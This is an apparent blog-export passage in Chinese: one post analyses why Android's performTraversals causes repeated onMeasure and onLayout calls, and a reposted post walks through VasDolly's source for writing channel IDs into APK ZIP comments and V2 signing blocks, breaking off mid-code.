ViewGroup对Child进行了2次measure、layout 我们知道View的绘制流程都始于ViewRootImpl的performTraversals方法，有理由怀疑performTranversals执行了2次。 PS:赶时间的朋友，可直接阅读验证三 验证一、二按照上面的猜想，先进入View类查找总共就2处调用了onMeasure方法如下： 123456789101112 public final void measure(int widthMeasureSpec, int heightMeasureSpec) &#123; ......... final boolean forceLayout = (mPrivateFlags &amp; PFLAG_FORCE_LAYOUT) == PFLAG_FORCE_LAYOUT; ......... int cacheIndex = forceLayout ? -1 : mMeasureCache.indexOfKey(key); if (cacheIndex &lt; 0 || sIgnoreMeasureCache) &#123; // measure ourselves, this should set the measured dimension flag back onMeasure(widthMeasureSpec, heightMeasureSpec); mPrivateFlags3 &amp;= ~PFLAG3_MEASURE_NEEDED_BEFORE_LAYOUT; &#125;......... &#125; 第二处： 123456789101112public void layout(int l, int t, int r, int b) &#123; if ((mPrivateFlags3 &amp; PFLAG3_MEASURE_NEEDED_BEFORE_LAYOUT) != 0) &#123; onMeasure(mOldWidthMeasureSpec, mOldHeightMeasureSpec); mPrivateFlags3 &amp;= ~PFLAG3_MEASURE_NEEDED_BEFORE_LAYOUT; &#125; ..........&#125; /** * Flag indicating that a call to measure() was skipped and should be done * instead when layout() is invoked. */ static final int PFLAG3_MEASURE_NEEDED_BEFORE_LAYOUT = 0x8; 第二次onMeasure，但是注释说的很明确，只有当measure方法未被调用的时候，才会在layout里面执行一次onMeasure方法，正常的view树测量流程，每个view的measure方法确实的都被调用过，所以猜想一排除。关于猜想二，以FrameLayout为例，确实是在onMeasure方法中对child进行了2次测量，但这是有条件限制的，需要FrameLayout的layout_width/height属性不能为match_parent或具体的值，且child的layout属性必须为match_parent，具有特殊性，实际上即使不满足以上条件依旧会进行2次测量，故排除猜想二。PS：关于一、二的源码分析，可参考View measure源码分析 验证三看了看代码，发现会执行2次performTranversals，也就会执行2次测量。 ViewRootImpl#performTraversals()代码片段一 123456789101112131415161718192021222324252627//1.由于第一次执行newSurface必定为true，需要先创建Surface嘛//为true则会执行else语句，所以第一次执行并不会执行 performDraw方法，即View的onDraw方法不会得到调用//第二次执行则为false，并未创建新的Surface，第二次才会执行 performDraw方法if (!cancelDraw &amp;&amp; !newSurface) &#123; if (!skipDraw || mReportNextDraw) &#123; if (mPendingTransitions != null &amp;&amp; mPendingTransitions.size() &gt; 0) &#123; for (int i = 0; i &lt; mPendingTransitions.size(); ++i) &#123; mPendingTransitions.get(i).startChangingAnimations(); &#125; mPendingTransitions.clear(); &#125; performDraw(); &#125;&#125; else &#123; //2.viewVisibility是wm.add的那个View的属性，View的默认值都是可见的 if (viewVisibility == View.VISIBLE) &#123; // Try again //3.再执行一次 scheduleTraversals，也就是会再执行一次performTraversals scheduleTraversals(); &#125; else if (mPendingTransitions != null &amp;&amp; mPendingTransitions.size() &gt; 0) &#123; for (int i = 0; i &lt; mPendingTransitions.size(); ++i) &#123; mPendingTransitions.get(i).endChangingAnimations(); &#125; mPendingTransitions.clear(); &#125;&#125; 断点SDK-23源码结果如下图所示： PS:断点源码建议使用模拟器，真机一般都是修改过的，与SDK代码不一致。 第一次performTranversals 第二次performTranversals 既然确定了performTravelsals会执行2次，那么肯定会执行2次measure方法，但是执行2次measure方法就一定会执行2次onMeasure方法吗？ 答案是否定，分析过View measure方法源码的都应知道measure方法做了2级测量优化： 如果flag不为forceLayout或者与上次测量规格（MeasureSpec）相比未改变，那么将不会进行重新测量（执行onMeasure方法），直接使用上次的测量值； 如果满足非强制测量的条件，即前后二次测量规格不一致，会先根据目前测量规格生成的key索引缓存数据，索引到就无需进行重新测量;如果targetSDK小于API 20则二级测量优化无效，依旧会重新测量，不会采用缓存测量值。照理第二次测量应该会取测量的缓存值，并不会重新测量（调用onMeasure）的。然而实际上确重新测量了，那么极有可能就是第二次performMeasure传入的测量规格与第一次不同，因为在layout执行中已经将flag force_layout置为false了，代码如下： 1234567public void layout(int l, int t, int r, int b) &#123; ......... //mPrivateFlags第16位设置为0,0表示不强制layout //PFLAG_FORCE_LAYOUT = 0x00001000 mPrivateFlags &amp;= ~PFLAG_FORCE_LAYOUT; mPrivateFlags3 |= PFLAG3_IS_LAID_OUT; &#125; 按照刚才的分析，前后二次的传入的测量规格应该不一致，然而事实是2次传入onMeasure()的测量规格一致，结果如下： log信息 那么问题又来了，为什么会测量三次呢？首先声明的是，并不是因为FrameLayout的多次测量，此处的自定义View并不满足FrameLayout测量2次child的条件。经过断点跟踪SDK源码发现： 第一次performTranversals会执行2次performMeasure： 先执行measureHierarchy方法中的performMeasure方法 第一次执行处 方法调用栈 接着执行后面的performMeasure， 第二次执行处 方法调用栈 第二次performTranversals则是只执行measureHierarchy中的performMeasure方法 这就能解释为什么前2次测量都执行了onMeasure方法，而未采用测量优化策略，因为前2次performMeasure并未经过performLayout，也即forceLayout的标志位一直为true，自然不会取缓存优化。理论上第三次测量经过第一次performTranversals中的performLayout，强制layout的flag应该为false，然而实际上却又变成了true，至于在哪儿恢复为true的，我在源码中并没有找到答案。 但是这在api24、25上却及其符合我们的推论，第三次强制layout的flag为false，即第二次performTranversals并不会导致View的onMeasure方法的调用，由于未调用onMeasure方法，也不会调用onLayout方法，即api 25只会执行2次onMeasure、一次onLayout、一次onDraw，如下图所示： SDK-24 SDK-25 总结api25-24：执行2次onMeasure、2次onLayout、1次onDraw，理论上执行三次测量，但由于测量优化策略，第三次不会执行onMeasure。 api23-21：执行3次onMeasure、2次onLayout、1次onDraw，forceLayout标志位，离奇被置为true，导致无测量优化。 api19-16：执行2次onMeasure、2次onLayout、1次onDraw，原因第一次performTranversals中只会执行measureHierarchy中的performMeasure，forceLayout标志位，离奇被置位true，导致无测量优化。 总之，造成这个现象的根本原因是performTranversal函数在View的测量流程中会执行2次。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"带你了解腾讯开源的多渠道打包技术 VasDolly源码解析","slug":"（转载）带你了解腾讯开源的多渠道打包技术-VasDolly源码解析","date":"2018-11-19T12:49:35.000Z","updated":"2020-05-11T07:23:44.910Z","comments":true,"path":"2018/11/19/（转载）带你了解腾讯开源的多渠道打包技术-VasDolly源码解析/","link":"","permalink":"https://superxlcr.github.io/2018/11/19/（转载）带你了解腾讯开源的多渠道打包技术-VasDolly源码解析/","excerpt":"","text":"本文转自：https://blog.csdn.net/lmj623565791/article/details/79998048 概要大家应该都清楚，大家上线app，需要上线各种平台，比如：小米，华为，百度等等等等，我们多数称之为渠道，如果发的渠道多，可能有上百个渠道。针对每个渠道，我们希望可以获取各个渠道的一些独立的统计信息，比如：下载量等。那么，如何区分各个渠道呢？我们需要一个特性的标识符与该渠道对应，这个标识符肯定是要包含在apk中的。那么，我们就要针对每个渠道包去设置一个特定的标识符，然后打一个特定的apk。这个过程可以手动去完成，每次修改一个字符串，然后手动打包。大家都清楚打包是一个相当耗时的过程，要是打几百个渠道包，这种枯燥重复的任务，当然不是我们所能容忍的。当然，我们会想到，这样的需求，官方肯定有解决方案。没错，Gradle Plugin为我们提供了一个自动化的方案，我们可以利用占位符，然后在build.gradle中去配置多个渠道信息，这样就可以将枯燥重复的任务自动化了。这样的方式最大的问题，就是效率问题，每个渠道包，都要执行一遍构建流程。自动化了，时间依然过长，还是不能忍。接下来就是寻找高效率的方案了。因为本文是源码解析，就不饶弯子了~~目前针对 V1（Android N开始推出了V2），快速的方案，主要有： 美团Android自动化之旅—生成渠道包主要利用修改apk的目录META-INF中添加空文件，由于不需要重新签名，操作非常快。 利用zip文件中的comment的字段，例如VasDolly 后面在解析源码时，会详细说明方式2。自Android N之后，Google建议使用V2来做签名，因为这样更加安全（对整个apk文件进行hash校验，无法修改apk信息），安装速度也更加高效（无需解析校验单个文件，v1需要单个文件校验hash）。美团对此动作非常快，立马推出了： 新一代开源Android渠道包生成工具Walle 其原理是利用v2的方式在做签名时，在apk中插入了一个签名块（安装时校验apk的hash不包含此块），该快中允许插入一些key-value对，于是将签名插在该区域。当然，腾讯的VasDolly采取的也是相同的方案。本文，为VasDolly的源码解析，即会详细分析： 针对v1签名方式，利用zip的comment区域 针对v2签名方式，利用apk中的签名块中插入key-value 本文不涉及v1，v2具体的签名方式，以及安装时的校验流程，这些内容在： VasDolly实现原理 一文中，说的非常详细。本文重点是源码的解析。 接入VasDolly其实，接入非常简单，而且readme写的非常详细。但是为了文章的完整性，简单陈述一下。 根目录build.gradle12345buildscript &#123; dependencies &#123; classpath 'com.leon.channel:plugin:1.1.7' &#125;&#125; app的build.gradle123456789101112131415161718192021222324252627282930313233343536apply plugin: 'channel'android &#123; signingConfigs &#123; release &#123; storeFile file(RELEASE_STORE_FILE) storePassword RELEASE_STORE_PASSWORD keyAlias RELEASE_KEY_ALIAS keyPassword RELEASE_KEY_PASSWORD v1SigningEnabled true v2SigningEnabled false &#125; &#125; buildTypes &#123; release &#123; signingConfig signingConfigs.release minifyEnabled false proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro' &#125; &#125; channel&#123; //指定渠道文件 channelFile = file(\"/Users/zhanghongyang01/git-repo/learn/VasDollyTest/channel.txt\") //多渠道包的输出目录，默认为new File(project.buildDir,\"channel\") baseOutputDir = new File(project.buildDir,\"channel\") //多渠道包的命名规则，默认为：$&#123;appName&#125;-$&#123;versionName&#125;-$&#123;versionCode&#125;-$&#123;flavorName&#125;-$&#123;buildType&#125; apkNameFormat ='$&#123;appName&#125;-$&#123;versionName&#125;-$&#123;versionCode&#125;-$&#123;flavorName&#125;-$&#123;buildType&#125;' //快速模式：生成渠道包时不进行校验（速度可以提升10倍以上） isFastMode = true &#125;&#125;dependencies &#123; api 'com.leon.channel:helper:1.1.7'&#125; 首先要apply plugin，然后在android的闭包下写入channel相关信息。channel中需要制定一个channel.txt文件，其中每行代码一个渠道： 123c1c2c3 dependencies中的依赖主要是为了获取渠道号的辅助类，毕竟你写入渠道信息的地方这么奇怪，肯定要提供API进行读取渠道号。注意：我们在signingConfigs的release中配置的是： 1v1SigningEnabled=true 和 1v2SigningEnabled=false ，先看V1方式的快速渠道包。在Terminal面板执行 1./gradlew channelRelease 执行完成后，即可在 1app/build/channel/release 下看到： 1234release ├── app-1.0-1-c1-release.apk ├── app-1.0-1-c2-release.apk └── app-1.0-1-c3-release.apk 注意：本文主要用于讲解源码，如果只需接入，尽可能查看github文档。 V1的渠道读取与写入首先我们需要知道对于V1的签名，渠道信息写在哪？这里直接白话说明一下，我们的apk实际上就是普通的zip，在一个zip文件的最后允许写入N个字符的注释，我们关注的zip末尾两个部分：2字节的的注释长度+N个字节的注释。那么，我们只要把签名内容作为注释写入，再修改2字节的注释长度即可。现在需要考虑的是我们怎么知道一个apk有没有写入这个渠道信息呢，需要有一个判断的标准：这时候，魔数这个概念产生了，我们可以在文件文件末尾写入一个特殊的字符串，当我们读取文件末尾为这个特殊的字符串，即可认为该apk写入了渠道信息。 很多文件类型起始部分都包含特性的魔数用于区分文件类型。 最终的渠道信息为：渠道字符串+渠道字符串长度+魔数 读取有了上面的分析，读取就简单了： 拿到本地的apk文件 读取固定字节与预定义魔数做比对 然后再往前读取两个字节为渠道信息长度 再根据这个长度往前读取对应字节，即可取出渠道信息。 在看源码之前，我们也可以使用二进制编辑器打开打包好的Apk，看末尾的几个字节，如图：咱们逆着看： 首先读取8个字节，对应一个特殊字符串“ltlovezh” 往前两个字节为02 00，对应渠道信息长度，实际值为2. 再往前读取2个字节为63 31，对照ASCII表，即可知为c1 这样我们就读取除了渠道信息为：c1。这么看代码也不复杂，最后看一眼代码吧：代码中通过ChannelReaderUtil.getChannel获取渠道信息： 1234567891011public static String getChannel(Context context) &#123; if (mChannelCache == null) &#123; String channel = getChannelByV2(context); if (channel == null) &#123; channel = getChannelByV1(context); &#125; mChannelCache = channel; &#125; return mChannelCache;&#125; 我们只看v1，根据调用流程，最终会到：V1SchemeUtil.readChannel方法： 12345678910111213141516171819202122232425262728293031323334public static String readChannel(File file) throws Exception &#123; RandomAccessFile raf = null; try &#123; raf = new RandomAccessFile(file, \"r\"); long index = raf.length(); byte[] buffer = new byte[ChannelConstants.V1_MAGIC.length]; index -= ChannelConstants.V1_MAGIC.length; raf.seek(index); raf.readFully(buffer); // whether magic bytes matched if (isV1MagicMatch(buffer)) &#123; index -= ChannelConstants.SHORT_LENGTH; raf.seek(index); // read channel length field int length = readShort(raf); if (length &gt; 0) &#123; index -= length; raf.seek(index); // read channel bytes byte[] bytesComment = new byte[length]; raf.readFully(bytesComment); return new String(bytesComment, ChannelConstants.CONTENT_CHARSET); &#125; else &#123; throw new Exception(\"zip channel info not found\"); &#125; &#125; else &#123; throw new Exception(\"zip v1 magic not found\"); &#125; &#125; finally &#123; if (raf != null) &#123; raf.close(); &#125; &#125;&#125; 使用了RandomAccessFile，可以很方便的使用seek指定到具体的字节处。注意第一次seek的目标是 1length - magic.length ，即对应我们的读取魔数，读取到比对是否相同。如果相同，再往前读取 1SHORT_LENGTH = 2 个字节，读取为short类型，即为渠道信息所占据的字节数。再往前对去对应的长度，转化为String，即为渠道信息，与我们前面的分析一模一样。ok，读取始终是简单的。后面还要看如何写入以及如何自动化。 写入v1渠道信息写入渠道信息，先思考下，有个apk，需要写入渠道信息，需要几步： 找到合适的写入位置 写入渠道信息、写入长度、写入魔数 好像唯一的难点就是找到合适的位置。但是找到这个合适的位置，又涉及到zip文件的格式内容了。大致讲解下：zip的末尾有一个数据库，这个数据块我们叫做EOCD块，分为4个部分： 4字节，固定值0x06054b50 16个字节，不在乎其细节 2个字节，注释长度 N个字节，注释内容 知道这个规律后，我们就可以通过匹配1中固定值来确定对应区域，然后seek到注释处。可能99.99%的apk默认是不包含注释内容的，所以直接往前seek 22个字节，读取4个字节做下匹配即可。但是如果已经包含了注释内容，就比较难办了。很多时候，我们会正向从头开始按协议读取zip文件格式，直至到达目标区域。不过VasDolly的做法是，从文件末尾seek 22 ~ 文件size - 22，逐一匹配。我们简单看下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static void writeChannel(File file, String channel) throws Exception &#123; byte[] comment = channel.getBytes(ChannelConstants.CONTENT_CHARSET); Pair&lt;ByteBuffer, Long&gt; eocdAndOffsetInFile = getEocd(file); if (eocdAndOffsetInFile.getFirst().remaining() == ZipUtils.ZIP_EOCD_REC_MIN_SIZE) &#123; System.out.println(\"file : \" + file.getAbsolutePath() + \" , has no comment\"); RandomAccessFile raf = new RandomAccessFile(file, \"rw\"); //1.locate comment length field raf.seek(file.length() - ChannelConstants.SHORT_LENGTH); //2.write zip comment length (content field length + length field length + magic field length) writeShort(comment.length + ChannelConstants.SHORT_LENGTH + ChannelConstants.V1_MAGIC.length, raf); //3.write content raf.write(comment); //4.write content length writeShort(comment.length, raf); //5. write magic bytes raf.write(ChannelConstants.V1_MAGIC); raf.close(); &#125; else &#123; System.out.println(\"file : \" + file.getAbsolutePath() + \" , has comment\"); if (containV1Magic(file)) &#123; try &#123; String existChannel = readChannel(file); if (existChannel != null)&#123; file.delete(); throw new ChannelExistException(\"file : \" + file.getAbsolutePath() + \" has a channel : \" + existChannel + \", only ignore\"); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; int existCommentLength = ZipUtils.getUnsignedInt16(eocdAndOffsetInFile.getFirst(), ZipUtils.ZIP_EOCD_REC_MIN_SIZE - ChannelConstants.SHORT_LENGTH); int newCommentLength = existCommentLength + comment.length + ChannelConstants.SHORT_LENGTH + ChannelConstants.V1_MAGIC.length; RandomAccessFile raf = new RandomAccessFile(file, \"rw\"); //1.locate comment length field raf.seek(eocdAndOffsetInFile.getSecond() + ZipUtils.ZIP_EOCD_REC_MIN_SIZE - ChannelConstants.SHORT_LENGTH); //2.write zip comment length (existCommentLength + content field length + length field length + magic field length) writeShort(newCommentLength, raf); //3.locate where channel should begin raf.seek(eocdAndOffsetInFile.getSecond() + ZipUtils.ZIP_EOCD_REC_MIN_SIZE + existCommentLength); //4.write content raf.write(comment); //5.write content length writeShort(comment.length, raf); //6.write magic bytes raf.write(ChannelConstants.V1_MAGIC); raf.close(); &#125;&#125; getEocd(file)的的返回值是 1Pair&lt;ByteBuffer, Long&gt; ，多数情况下first为EOCD块起始位置到结束后的内容；second为EOCD块起始位置。if为apk本身无comment的情况，这种方式属于大多数情况，从文件末尾，移动2字节，该2字节为注释长度，然后组装注释内容，重新计算注释长度，重新写入注释长度，再写入注释内容，最后写入MAGIC魔数。else即为本身存在comment的情况，首先读取原有注释长度，然后根据渠道等信息计算出先的注释长度，写入。 gradle自动化最后我们看下，是如何做到输入 1./gradle channelRelease 就实现所有渠道包的生成呢。这里主要就是解析gradle plugin了，如果你还没有自定义过plugin，非常值得参考。代码主要在VasDolly/plugin这个module.入口代码为ApkChannelPackagePlugin的apply方法。主要代码： 1234567891011121314project.afterEvaluate &#123; project.android.applicationVariants.all &#123; variant -&gt; def variantOutput = variant.outputs.first(); def dirName = variant.dirName; def variantName = variant.name.capitalize(); Task channelTask = project.task(\"channel$&#123;variantName&#125;\", type: ApkChannelPackageTask) &#123; mVariant = variant; mChannelExtension = mChannelConfigurationExtension; mOutputDir = new File(mChannelConfigurationExtension.baseOutputDir, dirName) mChannelList = mChanneInfolList dependsOn variant.assemble &#125; &#125;&#125; 为每个variantName添加了一个task，并且依赖于 1variant.assemble 。也就是说，当我们执行 1./gradlew channelRelease 时，会先执行assemble，然后对产物apk做后续操作。重点看这个Task， 1ApkChannelPackageTask 。执行代码为： 123456789@TaskActionpublic void channel() &#123; //1.check all params checkParameter(); //2.check signingConfig , determine channel package mode checkSigningConfig() //3.generate channel apk generateChannelApk();&#125; 注释也比较清晰，首先channelFile、baseOutputDir等相关参数。接下来校验signingConfig中v2SigningEnabled与v1SigningEnabled，确定使用V1还是V2 mode，我们上文中将v2SigningEnabled设置为了false，所以这里为V1_MODE。最后就是生成渠道apk了： 1234567891011121314151617181920212223242526void generateV1ChannelApk() &#123; // 省略了一些代码 mChannelList.each &#123; channel -&gt; String apkChannelName = getChannelApkName(channel) println \"generateV1ChannelApk , channel = $&#123;channel&#125; , apkChannelName = $&#123;apkChannelName&#125;\" File destFile = new File(mOutputDir, apkChannelName) copyTo(mBaseApk, destFile) V1SchemeUtil.writeChannel(destFile, channel) if (!mChannelExtension.isFastMode)&#123; //1. verify channel info if (V1SchemeUtil.verifyChannel(destFile, channel)) &#123; println(\"generateV1ChannelApk , $&#123;destFile&#125; add channel success\") &#125; else &#123; throw new GradleException(\"generateV1ChannelApk , $&#123;destFile&#125; add channel failure\") &#125; //2. verify v1 signature if (VerifyApk.verifyV1Signature(destFile)) &#123; println \"generateV1ChannelApk , after add channel , apk $&#123;destFile&#125; v1 verify success\" &#125; else &#123; throw new GradleException(\"generateV1ChannelApk , after add channel , apk $&#123;destFile&#125; v1 verify failure\") &#125; &#125; &#125; println(\"------ $&#123;project.name&#125;:$&#123;name&#125; generate v1 channel apk , end ------\")&#125; 很简单，遍历channelList，然后调用 1V1SchemeUtil.writeChannel ，该方法即我们上文解析过的方法。如果fastMode设置为false，还会读取出渠道再做一次强校验；以及会通过apksig做对签名进行校验。ok，到这里我们就完全剖析了基于V1的快速签名的全过程。接下来我们看基于v2的快速签名方案。 基于V2的快速签名方案关于V2签名的产生原因，原理以及安装时的校验过程可以参考 VasDolly实现原理。我这里就抛开细节，尽可能让大家能明白整个过程，v2签名的原理可以简单理解为： 我们的apk其实是个zip，我们可以理解为3块：块1+块2+块3 签名让我们的apk变成了4部分：块1+签名块+块2+块3 在这个签名块的某个区域，允许我们写一些key-value对，我们就将渠道信息写在这个地方。这里有一个问题，v2不是说是对整个apk进行校验吗？为什么还能够让我们在apk中插入这样的信息呢？因为在校验过程中，对于签名块是不校验的（细节上由于我们插入了签名块，某些偏移量会变化，但是在校验前，Android系统会先重置偏移量），而我们的渠道信息刚好写在这个签名块中。好了，细节一会看代码。 读取渠道信息写入渠道信息，根据我们上述的分析，流程应该大致如下： 找到签名块 找到签名块中的key-value的地方 读取出所有的key-value，找到我们特定的key对应的渠道信息 这里我们不按照整个代码流程走了，太长了，一会看几段关键代码。 如何找到签名块我们的apk现在格式是这样的： 1块1+签名块+块2+块3 其中块3称之为EOCD，现在必须要展示下其内部的数据结构了： 图片来自：参考 在V1的相关代码中，我们已经可以定位到EOCD的位置了，然后往下16个字节即可拿到 1Offset of start of central directory 即为块2开始的位置，也为签名块末尾的位置。块2 再往前，就可以获取到我们的 签名块了。我们先看一段代码，定位到 块2 的开始位置。 123456789101112131415161718192021# V2SchemeUtilpublic static ByteBuffer getApkSigningBlock(File channelFile) throws ApkSignatureSchemeV2Verifier.SignatureNotFoundException, IOException &#123; RandomAccessFile apk = new RandomAccessFile(channelFile, \"r\"); //1.find the EOCD Pair&lt;ByteBuffer, Long&gt; eocdAndOffsetInFile = ApkSignatureSchemeV2Verifier.getEocd(apk); ByteBuffer eocd = eocdAndOffsetInFile.getFirst(); long eocdOffset = eocdAndOffsetInFile.getSecond(); if (ZipUtils.isZip64EndOfCentralDirectoryLocatorPresent(apk, eocdOffset)) &#123; throw new ApkSignatureSchemeV2Verifier.SignatureNotFoundException(\"ZIP64 APK not supported\"); &#125; //2.find the APK Signing Block. The block immediately precedes the Central Directory. long centralDirOffset = ApkSignatureSchemeV2Verifier.getCentralDirOffset(eocd, eocdOffset);//通过eocd找到中央目录的偏移量 //3. find the apk V2 signature block Pair&lt;ByteBuffer, Long&gt; apkSignatureBlock = ApkSignatureSchemeV2Verifier.findApkSigningBlock(apk, centralDirOffset);//找到V2签名块的内容和偏移量 return apkSignatureBlock.getFirst();&#125; 首先发现EOCD块，这个前面我们已经分析了。然后寻找到签名块的位置，上面我们已经分析了只要往下移动16字节即可到达签名块末尾 ，那么看下 1ApkSignatureSchemeV2Verifier.getCentralDirOffset 代码，最终调用： 123456public static long getZipEocdCentralDirectoryOffset(ByteBuffer zipEndOfCentralDirectory) &#123; assertByteOrderLittleEndian(zipEndOfCentralDirectory); return getUnsignedInt32( zipEndOfCentralDirectory, zipEndOfCentralDirectory.position() + 16);&#125; 到这里我们已经可以到达签名块末尾了。我们继续看findApkSigningBlock找到V2签名块的内容和偏移量： 123456789101112131415161718192021222324252627public static Pair&lt;ByteBuffer, Long&gt; findApkSigningBlock( RandomAccessFile apk, long centralDirOffset) throws IOException, SignatureNotFoundException &#123; ByteBuffer footer = ByteBuffer.allocate(24); footer.order(ByteOrder.LITTLE_ENDIAN); apk.seek(centralDirOffset - footer.capacity()); apk.readFully(footer.array(), footer.arrayOffset(), footer.capacity()); if ((footer.getLong(8) != APK_SIG_BLOCK_MAGIC_LO) || (footer.getLong(16) != APK_SIG_BLOCK_MAGIC_HI)) &#123; throw new SignatureNotFoundException( \"No APK Signing Block before ZIP Central Directory\"); &#125; // Read and compare size fields long apkSigBlockSizeInFooter = footer.getLong(0); int totalSize = (int) (apkSigBlockSizeInFooter + 8); long apkSigBlockOffset = centralDirOffset - totalSize; ByteBuffer apkSigBlock = ByteBuffer.allocate(totalSize); apkSigBlock.order(ByteOrder.LITTLE_ENDIAN); apk.seek(apkSigBlockOffset); apk.readFully(apkSigBlock.array(), apkSigBlock.arrayOffset(), apkSigBlock.capacity()); return Pair.create(apkSigBlock, apkSigBlockOffset);&#125; 这里我们需要介绍下签名块相关信息了： 图片来自：参考中间的不包含此8字节，值得是该ID-VALUE的size值不包含此8字节。 首先往前读取24个字节，即读取了签名块大小64bits+魔数128bits；然后会魔数信息与实际的魔数对比。接下来读取8个字节为apkSigBlockSizeInFooter，即签名块大小。然后+8加上上图顶部的8个字节。最后将整个签名块读取到ByteBuffer中返回。此时我们已经有了签名块的所有数据了。接下来我们要读取这个签名块中所有的key-value对！ 1234567891011121314151617181920212223242526# V2SchemeUtilpublic static Map&lt;Integer, ByteBuffer&gt; getAllIdValue(ByteBuffer apkSchemeBlock) &#123; ApkSignatureSchemeV2Verifier.checkByteOrderLittleEndian(apkSchemeBlock); ByteBuffer pairs = ApkSignatureSchemeV2Verifier.sliceFromTo(apkSchemeBlock, 8, apkSchemeBlock.capacity() - 24); Map&lt;Integer, ByteBuffer&gt; idValues = new LinkedHashMap&lt;Integer, ByteBuffer&gt;(); // keep order int entryCount = 0; while (pairs.hasRemaining()) &#123; entryCount++; long lenLong = pairs.getLong(); int len = (int) lenLong; int nextEntryPos = pairs.position() + len; int id = pairs.getInt(); idValues.put(id, ApkSignatureSchemeV2Verifier.getByteBuffer(pairs, len - 4));//4 is length of id if (id == ApkSignatureSchemeV2Verifier.APK_SIGNATURE_SCHEME_V2_BLOCK_ID) &#123; System.out.println(\"find V2 signature block Id : \" + ApkSignatureSchemeV2Verifier.APK_SIGNATURE_SCHEME_V2_BLOCK_ID); &#125; pairs.position(nextEntryPos); &#125; return idValues;&#125; 首先读取8到capacity() - 24中的内容，即所有的id-value集合。然后进入while循环，读取一个个key-value存入idValues，我们看下循环体内： pairs.getLong，读取8个字节，即此id-value块的size 然后pairs.getInt，读取4个字节，即可得到id size - 4 中包含的内容即为value 如此循环，得到所有的idValues。有了所有的idValues，然后根据特定的id，即可获取我们的渠道信息了。即： 12345# ChannelReaderpublic static String getChannel(File channelFile) &#123; System.out.println(\"try to read channel info from apk : \" + channelFile.getAbsolutePath()); return IdValueReader.getStringValueById(channelFile, ChannelConstants.CHANNEL_BLOCK_ID);&#125; 这样我们就走通了读取的逻辑。我替大家总结下： 根据zip的格式，先定位到EOCD的开始位置 然后根据EOCD中的内容定位到签名块末尾 然后根据签名块中的数据格式，逐一读取出id-values 我们的渠道信息与一个特点的id映射，读取出即可 写入渠道信息先思考下，现在要正视的是，目前到我们这里已经是v2签名打出的包了。那么我们应该找到签名块中的id-values部分，把我们的渠道信息插入进去。大致的方式可以为： 读取出块1，签名块，块2，EOCD 在签名块中插入渠道信息 回写块1，签名块，块2，EOCD 读取出相关信息123456789101112131415161718192021222324252627# V2SchemeUtilpublic static ApkSectionInfo getApkSectionInfo(File baseApk) &#123; RandomAccessFile apk = new RandomAccessFile(baseApk, \"r\"); //1.find the EOCD and offset Pair&lt;ByteBuffer, Long&gt; eocdAndOffsetInFile = ApkSignatureSchemeV2Verifier.getEocd(apk); ByteBuffer eocd = eocdAndOffsetInFile.getFirst(); long eocdOffset = eocdAndOffsetInFile.getSecond(); //2.find the APK Signing Block. The block immediately precedes the Central Directory. long centralDirOffset = ApkSignatureSchemeV2Verifier.getCentralDirOffset(eocd, eocdOffset);//通过eocd找到中央目录的偏移量 Pair&lt;ByteBuffer, Long&gt; apkSchemeV2Block = ApkSignatureSchemeV2Verifier.findApkSigningBlock(apk, centralDirOffset);//找到V2签名块的内容和偏移量 //3.find the centralDir Pair&lt;ByteBuffer, Long&gt; centralDir = findCentralDir(apk, centralDirOffset, (int) (eocdOffset - centralDirOffset)); //4.find the contentEntry Pair&lt;ByteBuffer, Long&gt; contentEntry = findContentEntry(apk, (int) apkSchemeV2Block.getSecond().longValue()); ApkSectionInfo apkSectionInfo = new ApkSectionInfo(); apkSectionInfo.mContentEntry = contentEntry; apkSectionInfo.mSchemeV2Block = apkSchemeV2Block; apkSectionInfo.mCentralDir = centralDir; apkSectionInfo.mEocd = eocdAndOffsetInFile; System.out.println(\"baseApk : \" + baseApk.getAbsolutePath() + \" , ApkSectionInfo = \" + apkSectionInfo); return apkSectionInfo;&#125; 首先读取出EOCD，这个代码见过多次了。 然后根据EOCD读取到中间目录的偏移量（块2）。 将中间目录完整的内容读取出来， 读取出块1 全部都存储到apkSectionInfo中。目前我们将整个apk按区域读取出来了。 签名块中插入渠道信息123456789# ChannelWriterpublic static void addChannel(ApkSectionInfo apkSectionInfo, File destApk, String channel) &#123; byte[] buffer = channel.getBytes(ChannelConstants.CONTENT_CHARSET); ByteBuffer channelByteBuffer = ByteBuffer.wrap(buffer); //apk中所有字节都是小端模式 channelByteBuffer.order(ByteOrder.LITTLE_ENDIAN); IdValueWriter.addIdValue(apkSectionInfo, destApk, ChannelConstants.CHANNEL_BLOCK_ID, channelByteBuffer);&#125; 将渠道字符串与特定的渠道id准备好，调用addIdValue 123456# IdValueWriterpublic static void addIdValue(ApkSectionInfo apkSectionInfo, File destApk, int id, ByteBuffer valueBuffer) &#123; Map&lt;Integer, ByteBuffer&gt; idValueMap = new LinkedHashMap&lt;&gt;(); idValueMap.put(id, valueBuffer); addIdValueByteBufferMap(apkSectionInfo, destApk, idValueMap);&#125; 继续： 12345678910111213141516171819202122232425262728293031public static void addIdValueByteBufferMap(ApkSectionInfo apkSectionInfo, File destApk, Map&lt;Integer, ByteBuffer&gt; idValueMap) &#123; Map&lt;Integer, ByteBuffer&gt; existentIdValueMap = V2SchemeUtil.getAllIdValue(apkSectionInfo.mSchemeV2Block.getFirst()); existentIdValueMap.putAll(idValueMap); ByteBuffer newApkSigningBlock = V2SchemeUtil.generateApkSigningBlock(existentIdValueMap); ByteBuffer contentEntry = apkSectionInfo.mContentEntry.getFirst(); ByteBuffer centralDir = apkSectionInfo.mCentralDir.getFirst(); ByteBuffer eocd = apkSectionInfo.mEocd.getFirst(); long centralDirOffset = apkSectionInfo.mCentralDir.getSecond(); //update the offset of centralDir centralDirOffset += (newApkSigningBlock.remaining() - apkSectionInfo.mSchemeV2Block.getFirst().remaining()); ZipUtils.setZipEocdCentralDirectoryOffset(eocd, centralDirOffset);//修改了apkSectionInfo中eocd的原始数据 RandomAccessFile fIn = new RandomAccessFile(destApk, \"rw\"); long apkLength = contentEntry.remaining() + newApkSigningBlock.remaining() + centralDir.remaining() + eocd.remaining(); fIn.seek(0l); //1. write real content Entry block fIn.write(contentEntry.array(), 